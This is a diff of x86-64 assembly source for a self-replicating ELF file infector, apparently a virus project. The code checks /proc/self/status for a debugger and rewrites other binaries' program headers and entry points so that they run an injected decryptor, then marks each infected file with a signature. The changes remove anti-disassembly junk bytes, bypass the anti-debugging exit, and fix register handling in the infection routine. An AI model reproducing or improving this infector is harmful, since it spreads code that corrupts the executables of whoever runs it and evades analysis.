@@ -4,9 +4,6 @@ section .text
   global _start
 
 decryptor:
-  jmp .init + 2
-  .init:
-  db '\xb8\xd9'
   push rdx
   push rsp
 
@@ -33,9 +30,6 @@ decryptor:
 
 
 _start:
-  jmp ._start + 2
-  ._start:
-  db '\x48\x81'
   push rdx
   push rsp
   ; deactivate signals?
@@ -54,8 +48,10 @@ _start:
 
   mov DWORD [r15 + FINGERPRINT_ADD], 0 ; initialize to 0
 
+  jmp start_open
+
   .is_traced: ; read /proc/self/status and check if TracerPid is not 0
-    call .open_self_status ; pushing db 'woody' on stack
+    call .open_self_status
       .self_status:
         db '/proc/self/status', 0
 
@@ -108,7 +104,7 @@ _start:
           mov rdx, dbg_len
           syscall
       
-      jmp cleanup ; process is traced, exit
+      ; jmp cleanup ; process is traced, exit
 
   .not_traced:
       call .open_proc ; pushing db 'woody' on stack
@@ -534,7 +530,6 @@ _start:
       mov r13, [r15 + ST_SIZE] ; loading st_size in r13
       add r13, VADDR ; adding VADDR to target file size. Big address to not interfere with program.
       mov [r15 + PHDR_VADDR], r13 ; change vaddr to (stat.st_size + VADDR)
-      pop r13 ; restore r13
 
       mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct
       add qword [r15 + PHDR_FILESZ], exit - decryptor + JMP_REL_SIZE ; adjust filesize
@@ -550,13 +545,17 @@ _start:
       syscall
 
       cmp rax, 0
-      jle .close_and_next_file
+      jge .patch_ehdr
+        pop r13
+        jmp .close_and_next_file
 
+      .patch_ehdr:
       ; -- Patch ehdr
       mov r14, [r15 + EHDR_ENTRY] ; store original ehdr entry in r14
       mov [r15 + EHDR_ENTRY], r13 ; set entry to phdr.vaddr (VADDR)
       mov r13d, SCOTT_SIGNATURE ; load signature
       mov dword [r15 + EHDR_PAD], r13d ; add signature
+      pop r13 ; restore r13
 
 
       ; Write the patched ehdr
